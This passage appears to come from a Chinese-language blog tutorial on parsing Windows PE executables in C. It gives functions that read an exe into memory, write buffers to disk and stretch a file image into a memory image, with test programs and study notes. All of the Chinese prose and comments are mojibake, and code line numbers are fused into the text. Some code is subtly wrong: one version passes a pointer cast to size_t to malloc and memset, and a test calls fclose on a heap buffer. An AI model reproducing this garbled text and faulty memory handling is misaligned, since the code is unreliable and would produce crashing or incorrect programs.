= malloc(file_size); if (buffer == NULL) &#123; perror(&quot;Error allocating memory&quot;); fclose(pFile); return NULL; &#125; // freadæ˜¯ä»å½“å‰æ–‡ä»¶æŒ‡é’ˆå¼€å§‹è¯»å– // è¯»å–æ–‡ä»¶å†…å®¹åˆ°å†…å­˜ if (fread(buffer, 1, file_size, pFile) != file_size) &#123; perror(&quot;Error reading file into memory&quot;); free(buffer); fclose(pFile); return NULL; &#125; // å…³é—­æ–‡ä»¶ fclose(pFile); // å¦‚æœéœ€è¦ï¼Œè¿”å›æ–‡ä»¶å¤§å° if (length != NULL) &#123; *length = file_size; &#125; // è¿”å›å†…å­˜ç¼“å†²åŒºçš„æŒ‡é’ˆ return buffer;&#125;æµ‹è¯•å‡½æ•°main1234567891011121314151617181920212223#include &quot;ReadFileToFileBuffer.h&quot;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; // æ˜¾å¼åŒ…å«stdlib.hä»¥ä½¿ç”¨freeå’Œsize_t#define FILE_PATH &quot;C:\\\\WINDOWS\\\\system32\\ otepad.exe&quot;int main()&#123; size_t length; void *FileBuffer = ReadFileToFileBuffer(FILE_PATH, &amp;length); if (FileBuffer != NULL) &#123; // åœ¨è¿™é‡Œä½¿ç”¨file_dataæŒ‡é’ˆè®¿é—®æ–‡ä»¶å†…å®¹ // ... printf(&quot;address of this file: %p &quot;, FileBuffer); // ä½¿ç”¨å®Œæ¯•åï¼Œé‡Šæ”¾å†…å­˜ free(FileBuffer); &#125; return 0;&#125; MemoryToFile å°†å†…å­˜ä¸­çš„æ•°æ®å­˜å‚¨åˆ°ç£ç›˜çš„æ–‡ä»¶ä¸­(.exeæ ¼å¼) è¿‡ç¨‹fopenæ‰“å¼€çš„æ¨¡å¼ï¼šbï¼šä»¥äºŒè¿›åˆ¶æ¨¡å¼æ‰“å¼€wï¼šå¯å†™å‡½æ•°å£°æ˜å‡½æ•°å®ç°1234567891011121314#pragma once#include &lt;Windows.h&gt;#include &lt;stdlib.h&gt; //size_t/* å‡½æ•°åŠŸèƒ½ï¼šå°†å†…å­˜ä¸­pdataèµ·å§‹ï¼Œsizeä¸ªå­—èŠ‚çš„æ•°æ®å­˜åˆ°ç£ç›˜æ–‡ä»¶pOutputFilePathä¸­ inputå‚æ•°ï¼š pdataï¼šå†…å­˜é¦–åœ°å€ sizeï¼š å¤§å°ï¼ˆå­—èŠ‚ï¼‰ outputå‚æ•°ï¼š pOutputFilePathï¼šè¾“å‡ºçš„æ–‡ä»¶è·¯å¾„ è¿”å›å€¼ï¼š1è¡¨ç¤ºæˆåŠŸï¼Œ0è¡¨ç¤ºå¤±è´¥*/BOOL MemoryToFile(const char* pdata, size_t size, const char* pOutputFilePath);1234567891011121314151617181920212223242526272829#include &quot;MemoryToFile.h&quot;#include &lt;stdio.h&gt;#pragma warning(disable:4996) //disable warning of unsafe function fopenBOOL MemoryToFile(const char* pdata, size_t size, const char* pOutputFilePath)&#123;\tFILE* pFile;\t//æ‰“å¼€æ–‡ä»¶ï¼Œä»¥äºŒè¿›åˆ¶ï¼Œå¯å†™ æ‰“å¼€\tpFile = fopen(pOutputFilePath, &quot;wb&quot;);\tif (pFile == NULL)\t&#123; perror(&quot;Error opening file for writing&quot;); return 0;\t&#125;\t//å†™å…¥æ–‡ä»¶\tif (fwrite(pdata, 1, size, pFile) != size)\t&#123; perror(&quot;Error writing data to file&quot;); fclose(pFile); return 0;\t&#125;\tfclose(pFile);\treturn 1;&#125;æµ‹è¯•å‡½æ•°mainå…ˆè°ƒç”¨ReadFileToFileBufferå°†fg.exeè¯»åˆ°FileBufferä¸­ï¼Œç„¶åè°ƒç”¨MemoryBufferToFileå°†FileBufferå­˜ä¸ºfg2.exeã€‚å› ä¸ºæ²¡åšä¿®æ”¹ï¼Œå¯¹æ¯”ä¸¤ä¸ªæ–‡ä»¶MD5ï¼Œæ˜¯ä¸€æ ·çš„12345678910111213141516171819202122232425262728293031#include &quot;ReadFileToFileBuffer.h&quot;#include &quot;MemoryToFile.h&quot;#include &lt;stdio.h&gt; //printf perror#include &lt;stdlib.h&gt; //size_t free#define INPUT_FILE_PATH &quot;E:\\\\temp\\\\fg.exe&quot;#define OUTPUT_FILE_PATH &quot;E:\\\\temp\\\\fg2.exe&quot;int main()&#123; //å°†æ–‡ä»¶è¯»å…¥å†…å­˜ï¼Œåˆ›å»ºæ–‡ä»¶å†…å­˜æ˜ åƒ size_t length; void* FileBuffer = ReadFileToFileBuffer(INPUT_FILE_PATH, &amp;length); if ( NULL == FileBuffer ) &#123; printf(&quot;ReadFileToFileBuffer failed &quot;); return 0; &#125; //å°†å†…å­˜ä¸­çš„æ•°æ®å†™åˆ°æ–‡ä»¶ä¸­ if (!MemoryToFile((char*)FileBuffer, length, OUTPUT_FILE_PATH)) &#123; printf(&quot;MemoryToFile failed &quot;); fclose((FILE*)FileBuffer); return 0; &#125; free(FileBuffer); return 0;&#125; FileBufferToImageBuffer å°†FileBufferæ‹‰ä¼¸ä¸ºImageBuffer åšå®Œè¿™é“é¢˜çš„å¯å‘ï¼š å¯¹ç£ç›˜ä¸ŠPEæ–‡ä»¶åˆ°å†…å­˜çš„æ‹‰ä¼¸ï¼Œä¸æ­¢æ˜¯å¯¹é½å€¼å·®å¼‚ä¼šå¯¼è‡´æ‹‰ä¼¸ï¼Œé‚£äº›å› å«æœ‰æœªåˆå§‹åŒ–æ•°æ®ï¼ˆå¦‚.bssèŠ‚ï¼Œæˆ–.bsså·²åˆå¹¶åˆ°.dataèŠ‚ä¸­ï¼‰å¯¼è‡´å‡ºç°VitrualSize&gt;SizeOfRawDataçš„èŠ‚ï¼Œä¹Ÿä¼šå¯¼è‡´æ‹‰ä¼¸ã€‚ ç”³è¯·ç©ºé—´æ—¶æŒ‰SizeOfImageçš„å¤§å°ç”³è¯·ã€‚é‚£ä¹ˆå¯ä»¥æ¨å¯¼å‡ºSizeOfImageçš„å¤§å°è¦â‰¥æœ€åä¸€ä¸ªèŠ‚.VirtualAddress+max{Misc,SizeOfRawData}æŒ‰å†…å­˜å¯¹é½åçš„å€¼ï¼Œè¦ä¸ç”³è¯·çš„ç©ºé—´å¤§å°æ˜¯é”™çš„ã€‚ ä»FileBufferå°†èŠ‚æ•°æ®æ‹·åˆ°ImageBufferæ˜¯æŒ‰SizeOfRawDataæ¥æ‹·ï¼Œè€Œä¸æ˜¯max{Misc,SizeOfRawData}ï¼ŒåŸå› æœ‰äºŒï¼š æœªåˆå§‹åŒ–æ•°æ®è¦åœ¨å†…å­˜å ç”¨çš„ç©ºé—´ï¼Œç¼–è¯‘å™¨ç¼–è¯‘æ—¶å·²ç®—å¥½äº†ï¼Œä½“ç°åœ¨VirtualAddressä¸Šäº†ã€‚ å¦‚æœæŒ‰max{Misc,SizeOfRawData}æ‹·ï¼Œå¯èƒ½ä¼šå› ä¸ºå½“å‰è¿™ä¸ªèŠ‚çš„Miscå¤ªå¤§ï¼Œè€Œæ‹·åˆ°ä¸‹ä¸€ä¸ªèŠ‚çš„æ•°æ®ã€‚ ImageBufferç¦»PEæ–‡ä»¶çœŸæ­£è¿è¡Œçš„çŠ¶æ€è¿˜å·®ä¸€äº›å·¥ä½œï¼Œå…·ä½“æ˜¯å•¥æˆ‘ç›®å‰ä¸æ¸…æ¥šã€‚ æƒ³åˆ°å‚€å„¡è¿›ç¨‹åˆ›å»ºä¸€ä¸ªæŒ‚èµ·æ€çš„è¿›ç¨‹ï¼Œç„¶åä¿®æ”¹contentï¼Œä¿®æ”¹eipï¼Œæ¢å¤æ‰§è¡Œã€‚è¿™ä¸ªåˆ›å»ºäº†æŒ‚èµ·æ€åšäº†å“ªäº›äº‹å°±å¾ˆè€äººå¯»å‘³ï¼Œåæ­£è¿™é¢˜çš„æ‹‰ä¼¸åªæ˜¯æœ€åŸºç¡€çš„æ‹‰ä¼¸å·¥ä½œã€‚ ç»¼ä¸Šï¼ŒFileBufferå’ŒImageBufferçš„åŒºåˆ«æ˜¯ï¼š FileBufferçš„å„ä¸ªèŠ‚æ•°æ®ä»PointerToRawDataå¼€å§‹ ImageBufferçš„å„ä¸ªèŠ‚æ•°æ®ä»VirtualAddresså¼€å§‹ è¿™ä¸ªåŒºåˆ«è¦ä½œä¸ºæµ‹è¯•åˆ¤å®šä¾æ®æ¥ç¡®è®¤ä»£ç æ˜¯å¦å†™å¯¹ã€‚ è¿‡ç¨‹æ ¹æ®SizeOfImageçš„å¤§å°ï¼Œå¼€è¾Ÿä¸€å—ç¼“å†²åŒº(ImageBuffer)ï¼Œå¡«å……ä¸º0åˆ†å—æ‹·è´ä»FileBufferæ‹·SizeOfHeadersï¼ˆDOSå¤´+PEå¤´+èŠ‚è¡¨+å¡«å……ï¼‰-&gt;ImageBufferç”¨èŠ‚è¡¨ä¸­çš„å­—æ®µå¾ªç¯æ‹·è´å„ä¸ªèŠ‚æ•°æ®ä»FileBuffer+èŠ‚.PointerToRawDataæ‹·è´èŠ‚.SizeOfRawDataå¤§å°-&gt;ImageBuffer + èŠ‚.VirtualAddressæ€è€ƒè¯¯åŒº1ï¼šå¦‚ä½•å¡«å……é—´éš™æ€è€ƒè¯¯åŒºæ¥æºï¼šä¹‹å‰æ˜¯ä»¥å­¦ä¹ çš„è§†è§’ä»ä½åœ°å€åˆ°é«˜åœ°å€çœ‹å¾…PEï¼ˆç£ç›˜ä¸Šå’Œå†…å­˜ä¸­ï¼‰é‡Œé¢çš„å†…å®¹PE FileIn MemoryMZå¤´MZå¤´DOSå—DOSå—PEæ ‡è¯†PEæ ‡è¯†æ ‡å‡†PEå¤´æ ‡å‡†PEå¤´æ‰©å±•PEå¤´æ‰©å±•PEå¤´èŠ‚è¡¨èŠ‚è¡¨å¡«å……é—´éš™å¡«å……é—´éš™èŠ‚è¡¨ä¸€çš„æ•°æ®å¡«å……é—´éš™å¡«å……é—´éš™èŠ‚è¡¨ä¸€çš„æ•°æ®èŠ‚è¡¨äºŒçš„æ•°æ®å¡«å……é—´éš™å¡«å……é—´éš™å¡«å……é—´éš™èŠ‚è¡¨nçš„æ•°æ®èŠ‚è¡¨äºŒçš„æ•°æ®å¡«å……é—´éš™å¡«å……é—´éš™å¡«å……é—´éš™èŠ‚è¡¨nçš„æ•°æ®å¡«å……é—´éš™å¡«å……é—´éš™ç”³è¯·å®ŒSizeOfImageçš„ç©ºé—´ï¼Œå°†SizeofHeadersä»FileBufferæ‹·è´åˆ°ImageBufferåå°±ä¼šæƒ³å¦‚ä½•å¡«å……ä¸èŠ‚è¡¨ä¸€çš„æ•°æ®ä¹‹é—´çš„é—´éš™ã€‚ä½†å®é™…ä¸Šï¼Œç”³è¯·ç©ºé—´åï¼Œå…ˆæ•´å—å¡«å……ä¸º0ï¼Œåé¢å°±åªç”¨è€ƒè™‘æ‹·æœ‰æ•°æ®çš„éƒ¨åˆ†ï¼Œè€Œä¸ç”¨å•ç‹¬è€ƒè™‘æœ«å°¾å¡«å……0çš„é—®é¢˜ã€‚æ€è€ƒè¯¯åŒº2ï¼šFileAlignmentå’ŒSectionnAlignmentç›¸ç­‰ï¼Œæ˜¯å¦èƒ½ç›´æ¥å¤åˆ¶ä¸€ä»½FileBufferç„¶åè¿”å›æ€è€ƒè¯¯åŒºæ¥æºï¼šä»¥ä¸ºFileAlignmentå’ŒSectionnAlignmentä¸€æ ·ï¼ŒImageBufferå¤§å°å°±å’ŒFileBufferå¤§å°ä¸€æ ·ã€‚å®é™…ä¸Šï¼Œåœ¨FileAlignmentå’ŒSectionnAlignmentç›¸ç­‰çš„æƒ…å†µä¸‹ï¼Œé‚£äº›å«æœ‰æœªåˆå§‹åŒ–æ•°æ®å¯¼è‡´Misc&gt;SizeOfRawDataçš„èŠ‚ï¼Œä¹Ÿä¼šå¯¼è‡´æ‹‰ä¼¸ã€‚ä¹‹å‰è¿˜æƒ³ç€çœ‹æƒ…å†µåˆ†ç±»è®¨è®ºï¼šFileAlignmentå’ŒSectionnAlignmentæ˜¯å¦ç›¸ç­‰FileAlignment==SectionnAlignmentï¼Œè¯´æ˜ImageBufferå’ŒFileBufferä¸€æ ·ï¼Œä¸ç”¨æ‹‰ä¼¸ï¼Œç›´æ¥æ•´å—æ‹·è´FileAlignmentï¼=SectionnAlignmentï¼Œéœ€è¦å°†FileBufferåˆ†å—æ‹·è´1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &quot;FileBufferToImageBuffer.h&quot;#include &lt;Windows.h&gt;void* FileBufferToImageBuffer(const char* pBuffer, const size_t length)&#123;\t//DOSå¤´\tPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;\t//PEå¤´\tPIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);\t//æ ‡å‡†PEå¤´\tPIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pImageNTHeaders32 + 4);\t//æ‰©å±•PEå¤´\tPIMAGE_OPTIONAL_HEADER32 pImageOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + IMAGE_SIZEOF_FILE_HEADER);\t//èŠ‚è¡¨\tPIMAGE_SECTION_HEADER pImageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pImageOptionalHeader + pImageFileHeader-&gt;SizeOfOptionalHeader);\tvoid* ImageBuffer; ImageBuffer = malloc(pImageOptionalHeader-&gt;SizeOfImage); //FileAlignmtn==SectionnAlignmentæ—¶ï¼Œè€ƒè™‘åˆ°å¯èƒ½å‡ºç°SizeOfImageæ¯”FileBufferå¤§å°å¤§çš„æƒ…å†µï¼ŒæŒ‰SizeOfImageç”³è¯·å¤§å°ï¼Œç„¶åç„¶åæ•´å—æ‹·è´ //FileAlignmtnï¼=SectionnAlignmentæ—¶ï¼ŒæŒ‰SizeOfImageç”³è¯·å¤§å°\tif (ImageBuffer == NULL)\t&#123; perror(&quot;Error allocating memory for ImageBuffer&quot;); return NULL;\t&#125;\tmemset(ImageBuffer, 0, pImageOptionalHeader-&gt;SizeOfImage); //å¡«å……0\t//å°†FileBufferæ‹‰ä¼¸ä¸ºImageBufferï¼Œä¸¤ç§æƒ…å†µ\tif (pImageOptionalHeader-&gt;FileAlignment== pImageOptionalHeader-&gt;SectionAlignment)\t//FileAlignmtn==SectionnAlignmentï¼Œç›´æ¥æ‹·è´\t&#123; memcpy(ImageBuffer, pBuffer, length);\t&#125;\telse //FileAlignmtn!=SectionnAlignmentï¼Œåˆ†å—æ‹·è´\t&#123; //1ã€æ‹·SizeOfHeaders memcpy(ImageBuffer, pBuffer, pImageOptionalHeader-&gt;SizeOfHeaders); //2ã€å¾ªç¯æ‹·èŠ‚æ•°æ® for (int i = 0; i &lt; pImageFileHeader-&gt;NumberOfSections; i++) &#123; memcpy((void*)((DWORD)ImageBuffer + pImageSectionHeader[i].VirtualAddress), (void*)((DWORD)pBuffer + pImageSectionHeader[i].PointerToRawData), pImageSectionHeader[i].SizeOfRawData); &#125;\t&#125;\treturn ImageBuffer;&#125;æ€è€ƒè¯¯åŒº3ï¼šæ‹·è´èŠ‚æ•°æ®æ—¶ï¼Œé‚£äº›æœªåˆå§‹åŒ–æ•°æ®æ˜¯æ€ä¹ˆå±•å¼€çš„ï¼Œä¸ºä»€ä¹ˆæ˜¯æŒ‰SizeOfRawDataæ‹·ï¼Œè™½ç„¶æˆ‘çŸ¥é“æŒ‰Miscæ‹·å¯èƒ½æ‹·åˆ°ä¸‹ä¸€ä¸ªèŠ‚çš„æ•°æ®æˆ‘ä¼šå»æƒ³ä¸€ä¸ªèŠ‚æ•°æ®ä¸­æœªåˆå§‹åŒ–éƒ¨åˆ†æ˜¯å¦‚ä½•å±•å¼€çš„ï¼Œç„¶åæƒ³ä¸æ˜ç™½ã€‚ç°åœ¨ç”¨ä¸€ä¸ªä¾‹å­æ¥è¯´æ˜ï¼šå‡è®¾è¿™ä¸ªexeçš„FileAlignmentå’ŒSectionAlignmentä¸€æ ·å‡è®¾åœ¨æ–‡ä»¶ä¸­ï¼š.dataèŠ‚æ•°æ®.idataæ•°æ®Miscå’ŒSizeOfRawDataçš„å…³ç³»å«æœ‰æœªå¡«å……æ•°æ®ï¼Œå¯¼è‡´VirtualSize&gt;SizeOfRawDataVirtualSize&lt;SizeOfRawDataExcel.dataæ•°æ®å Excelä¸‰è¡Œï¼Œå¡«å……é—´éš™å 2è¡Œ.idataæ•°æ®å Excelä¸‰è¡Œï¼Œå¡«å……é—´éš™å 2è¡Œå¯¹äºæ¯ä¸ªèŠ‚ï¼Œä»PointerToRawDataå¼€å§‹å¤„å°†SizeOfRawDataå¤§å°æ‹·åˆ°VirtualAddressã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå› ä¸ºæ˜¯æŒ‰äº‹å…ˆç®—å¥½çš„VirtualAddressæ‹·ï¼Œå¯ä»¥å‘ç°.dataåœ¨å†…å­˜ä¸­äº†å¤šäº†ç©ºé—´ï¼Œè¿™å—ç©ºé—´ç›®å‰æ˜¯å¡«å……ä¸º0ï¼Œä½†æœªæ¥ä¼šç»™æœªåˆå§‹åŒ–æ•°æ®ç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæœªåˆå§‹åŒ–æ•°æ®åœ¨å†…å­˜å çš„ç©ºé—´ï¼Œç¼–è¯‘å™¨æå‰ç®—å¥½äº†ï¼Œä½“ç°åœ¨VirtualAddressä¸Šã€‚é‚£ä¹ˆæˆ‘ä»¬å¯¹äºæ¯ä¸ªèŠ‚æ•°æ®çš„æ‹·è´ï¼Œæ“ä½œä¸Šå°±æ˜¯æ‹·åˆ°VirtualAddressä¸Šã€‚ç–‘é—®ï¼Œmarkï¼Œé‚£æˆ‘å°†ä¸€ä¸ªPEæ–‡ä»¶æ‹‰ä¼¸åˆ°ImageBufferï¼Œç„¶åå¯¹PEåŠ¨æ‰‹è„šï¼Œç„¶åæ¢å¤åœ¨å­˜ç›˜ï¼Œå¡æ•°æ®ä¼šä¸ä¼šå ç”¨äº†é‚£äº›æœªåˆå§‹åŒ–æ•°æ®ç”¨çš„ç©ºé—´ï¼Ÿæˆ‘ä¸å¤ªçŸ¥é“â€œæœªåˆå§‹åŒ–çš„æ•°æ®åœ¨ç£ç›˜ä¸­ä¸å æœ‰ç©ºé—´ï¼Œä½†åœ¨å†…å­˜ä¸­è¦åˆ†é…ç©ºé—´â€å®ƒå®é™…æ˜¯æ€ä¹ˆæ“ä½œçš„ã€‚æ¯”å¦‚æˆ‘å£°æ˜äº†1000ä¸ªæœªèµ‹åˆå€¼çš„å…¨å±€å˜é‡ï¼ŒPEæ–‡ä»¶ä¸­å¦‚ä½•è®°å½•æœ‰1000ä¸ªæœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡ï¼Œå¹¶ä¸”åœ¨PEæ–‡ä»¶è½½å…¥å†…å­˜åæ‰¾åˆ°å®ƒä»¬ï¼Ÿè¿™ä¸ªä¿¡æ¯ç”¨ç¬¦å·è¡¨è¿˜æ˜¯ä»€ä¹ˆä¹‹ç±»çš„è®°å½•äº†ï¼Œåœ¨PEæ–‡ä»¶çš„å“ªé‡Œï¼Ÿã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ã€‹æåˆ°äº†ç¼–è¯‘å’Œé“¾æ¥æ—¶ï¼Œæ˜¯ç”¨ç¬¦å·è¡¨æ¥è®°å½•çš„ï¼Œä½†å¥½åƒæ²¡æåˆ°PEä¸­æ€ä¹ˆè¡¨ç¤ºã€‚æµ‹è¯•æ ·ä¾‹è¦åˆ†ä¸º4ç±»ï¼šç‰¹ç‚¹1ç‰¹ç‚¹2åºå·1æ–‡ä»¶å¯¹é½=å†…å­˜å¯¹é½ï¼Œä¸å­˜åœ¨Misc&gt;SizeOfRawDataçš„èŠ‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ–‡ä»¶å¤§å°=SizeOfImageæ¯ä¸ªèŠ‚çš„PointerToRawData=VirtualAddressåºå·2æ–‡ä»¶å¯¹é½=å†…å­˜å¯¹é½ï¼Œå­˜åœ¨Misc&gt;SizeOfRawDataçš„èŠ‚æ–‡ä»¶å¤§å°&lt;SizeOfImageå­˜åœ¨è‡³å°‘ä¸€ä¸ªèŠ‚çš„PointerToRawData&lt;VirtualAddressåºå·3æ–‡ä»¶å¯¹é½â‰ å†…å­˜å¯¹é½ï¼Œä¸å­˜åœ¨Misc&gt;SizeOfRawDataçš„èŠ‚æ–‡ä»¶å¤§å°&lt;SizeOfImageå­˜åœ¨è‡³å°‘ä¸€ä¸ªèŠ‚çš„PointerToRawData&lt;VirtualAddressåºå·4æ–‡ä»¶å¯¹é½â‰ å†…å­˜å¯¹é½ï¼Œå­˜åœ¨Misc&gt;SizeOfRawDataçš„èŠ‚æ–‡ä»¶å¤§å°&lt;SizeOfImageå­˜åœ¨è‡³å°‘ä¸€ä¸ªèŠ‚çš„PointerToRawData&lt;VirtualAddressé™¤äº†åºå·1èƒ½ç›´æ¥å¤åˆ¶FileBufferè¿”å›ï¼Œå…¶ä»–çš„éƒ½è¦æŒ‰ä¸Šè¾¹çš„è¿‡ç¨‹æ¥æ‹‰ä¼¸ã€‚è€Œä¸”åºå·1ä¹Ÿå¯èƒ½æ–‡ä»¶å¤§å°&lt;SizeOfImageï¼Œé‚£å°±ä¸åŠ åˆ¤æ–­ä¸åšåˆ†ç±»äº†ï¼Œæ¥ä¸€ä¸ªPEæ–‡ä»¶å°±æŒ‰ä¸Šè¾¹è¯´çš„æ‹‰ä¼¸è¿‡ç¨‹è¿›è¡Œæ‹‰ä¼¸ã€‚å‡½æ•°å£°æ˜å‡½æ•°å®ç°1234567891011121314#pragma once#include &lt;Windows.h&gt;/* å‡½æ•°åŠŸèƒ½ï¼šå°†FileBufferæ‹‰ä¼¸ä¸ºImageBuffer inputå‚æ•°ï¼š pBufferï¼šæŒ‡å‘FileBufferé¦–åœ°å€çš„æŒ‡é’ˆ outputå‚æ•°ï¼š SizeOfImageBufferï¼šè¿”å›ImageBufferçš„å¤§å°ï¼Œå³SizeOfImageçš„å€¼ è¿”å›å€¼ï¼š æˆåŠŸï¼Œè¿”å›ImageBufferé¦–åœ°å€æŒ‡é’ˆ å¤±è´¥ï¼Œè¿”å›NULL*/void* FileBufferToImageBuffer(const char* pBuffer, DWORD* SizeOfImageBuffer);1234567891011121314151617181920212223242526272829303132333435363738394041#include &quot;FileBufferToImageBuffer.h&quot;#include &lt;Windows.h&gt;void* FileBufferToImageBuffer(const char* pBuffer, DWORD* SizeOfImageBuffer)&#123;\t//DOSå¤´\tPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;\t//PEå¤´\tPIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);\t//æ ‡å‡†PEå¤´\tPIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pImageNTHeaders32 + 4);\t//æ‰©å±•PEå¤´\tPIMAGE_OPTIONAL_HEADER32 pImageOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + IMAGE_SIZEOF_FILE_HEADER);\t//èŠ‚è¡¨\tPIMAGE_SECTION_HEADER pImageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pImageOptionalHeader + pImageFileHeader-&gt;SizeOfOptionalHeader);\t*SizeOfImageBuffer = pImageOptionalHeader-&gt;SizeOfImage; //å­˜SizeOfImageçš„å€¼\tvoid* ImageBuffer; ImageBuffer = malloc((size_t)SizeOfImageBuffer); //æŒ‰SizeOfImageç”³è¯·å¤§å°\tif (ImageBuffer == NULL)\t&#123; perror(&quot;Error allocating memory for ImageBuffer&quot;); return NULL;\t&#125;\tmemset(ImageBuffer, 0, (size_t)SizeOfImageBuffer); //å¡«å……0\t//åˆ†å—æ‹·è´\t//1ã€æ‹·SizeOfHeaders\tmemcpy(ImageBuffer, pBuffer, pImageOptionalHeader-&gt;SizeOfHeaders);\t//2ã€å¾ªç¯æ‹·èŠ‚æ•°æ®\tfor (int i = 0; i &lt; pImageFileHeader-&gt;NumberOfSections; i++)\t&#123; memcpy((void*)((DWORD)ImageBuffer + pImageSectionHeader[i].VirtualAddress), (void*)((DWORD)pBuffer + pImageSectionHeader[i].PointerToRawData), pImageSectionHeader[i].SizeOfRawData);\t&#125; return ImageBuffer;&#125;æµ‹è¯•å¯¹input.exeè°ƒç”¨ReadFileToFileBufferåˆ›å»ºFileBufferè°ƒç”¨FileBufferToImageBufferå¯¹FileBufferåˆ›å»ºæ‹‰ä¼¸åçš„ImageBufferè°ƒç”¨MemoryToFileå¯¹ImageBufferå­˜åˆ°ç£ç›˜ä¸Šoutput.exeçœ‹output.exeå„ä¸ªèŠ‚æ•°æ®æ˜¯å¦ä»VirtualAddresså¼€å§‹æµ‹è¯•ç”¨çš„exeä»£è¡¨fg.exeæ–‡ä»¶å¯¹é½=å†…å­˜å¯¹é½ï¼Œä¸å­˜åœ¨Misc&gt;SizeOfRawDataçš„èŠ‚VC_HelloWorld.exeæ–‡ä»¶å¯¹é½=å†…å­˜å¯¹é½ï¼Œå­˜åœ¨Misc&gt;SizeOfRawDataçš„èŠ‚12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &quot;../CommonFiles/ReadFileToFileBuffer.h&quot;#include &quot;../CommonFiles/MemoryToFile.h&quot;#include &lt;stdio.h&gt; //printf perror#include &lt;stdlib.h&gt; //size_t free#include &quot;FileBufferToImageBuffer.h&quot;//#include &lt;windef.h&gt; //BOOL?//#include &lt;winnt.h&gt; //PE relative struct//#include &lt;Windows.h&gt; //When you include windows.h it will, in turn, include winnt.h#define INPUT_FILE_PATH &quot;E:\\\\temp\\\\fg.exe&quot;#define OUTPUT_FILE_PATH &quot;E:\\\\temp\\\\fg_output.exe&quot;int main()&#123; //å°†æ–‡ä»¶è¯»å…¥å†…å­˜ï¼Œåˆ›å»ºæ–‡ä»¶å†…å­˜æ˜ åƒFileBuffer size_t length; void* FileBuffer = ReadFileToFileBuffer(INPUT_FILE_PATH, &amp;length); if (NULL == FileBuffer) &#123; printf(&quot;ReadFileToFileBuffer failed &quot;); return 0; &#125; //FileBuffer-&gt;ImageBufferï¼Œæ‹‰ä¼¸ DWORD SizeOfImageBuffer; void* ImageBuffer; ImageBuffer = FileBufferToImageBuffer((char*)FileBuffer, &amp;SizeOfImageBuffer); if (NULL == ImageBuffer) &#123; printf(&quot;FileBufferToImageBuffer failed &quot;); free(FileBuffer); return 0; &#125; //å°†å†…å­˜ä¸­çš„æ•°æ®å†™åˆ°æ–‡ä»¶ä¸­ if (!MemoryToFile((char*)ImageBuffer, SizeOfImageBuffer, OUTPUT_FILE_PATH)) &#123; printf(&quot;MemoryToFile failed &quot;); free(FileBuffer); free(ImageBuffer); return 0; &#125; // ä½¿ç”¨å®Œæ¯•åï¼Œé‡Šæ”¾å†…å­˜ free(FileBuffer); free(ImageBuffer); return 0;&#125;fg.exeVC_HelloWorld.exeä¸é¢„æœŸç»“æœä¸€è‡´ã€‚å®é™…ä¸Šï¼Œfg.exeçš„ImageBufferå’ŒFileBufferå¤§å°ä¸€æ ·ï¼Œå¯ä»¥é€šè¿‡MD5ä¸€æ ·æ¥åˆ¤æ–­ã€‚VC_HelloWorld.exeï¼šç¼–è¯‘åFileAlignmentå’ŒSectionAlignmentéƒ½æ˜¯1000hVC_HelloWorld_output.exeï¼šæ‹‰ä¼¸åçš„exe1234567#include &lt;stdio.h&gt;int main()&#123;\tprintf(&quot;Hello World! &quot;);\treturn 0;&#125;ç”¨åå…­è¿›åˆ¶æŸ¥çœ‹å™¨ä¾æ¬¡çœ‹VC_HelloWorld_output.exeæ¯ä¸ªèŠ‚çš„èŠ‚æ•°æ®æ˜¯å¦ä»VitrualAddresså¼€å§‹ï¼Œå¦‚æœæ˜¯ï¼Œå³ç¬¦åˆé¢„æœŸ ImageBufferToNewFileBuffer å°†ImageBufferå‹ç¼©å›å»ï¼Œå‹ç¼©å›çš„å†…å­˜æ˜ åƒç§°ä¸ºNewFileBuffer è¿‡ç¨‹è§£æImageBufferä¸­çš„å­—æ®µï¼Œå¾—åˆ°éœ€è¦ç”³è¯·çš„ç©ºé—´å¤§å°SizeOfNewFileBuffer=SizeOfHeaders+æ¯ä¸ªèŠ‚çš„SizeOfRawDataæˆ–ç”¨æœ€åä¸€ä¸ªèŠ‚.PointerToRawData+æœ€åä¸€ä¸ªèŠ‚.SizeOfRawDataæ¥ç®—éœ€è¦ç”³è¯·çš„ç©ºé—´å¤§å°æ ¹æ®SizeOfNewFileBufferçš„å¤§å°ï¼Œå¼€è¾Ÿä¸€å—ç¼“å†²åŒº(NewFileBuffer)ï¼Œå¡«å……ä¸º0åˆ†å—æ‹·è´ä»ImageBufferæ‹·SizeOfHeadersï¼ˆDOSå¤´+PEå¤´+èŠ‚è¡¨+å¡«å……ï¼‰-&gt;NewFileBufferç”¨èŠ‚è¡¨ä¸­çš„å­—æ®µå¾ªç¯æ‹·è´å„ä¸ªèŠ‚æ•°æ®ä»ImageBuffer+èŠ‚.VirtualAddressæ‹·è´èŠ‚.SizeOfRawDataå¤§å°-&gt;NewFileBuffer+ èŠ‚.PointerToRawDataå‡½æ•°å£°æ˜å‡½æ•°å®ç°123456789101112131415#pragma once#include &lt;Windows.h&gt;/* å‡½æ•°åŠŸèƒ½ï¼šå°†ImageBufferå‹ç¼©ä¸ºNewFileBuffer inputå‚æ•°ï¼š pBufferï¼šæŒ‡å‘ImageBufferé¦–åœ°å€çš„æŒ‡é’ˆ outputå‚æ•°ï¼š 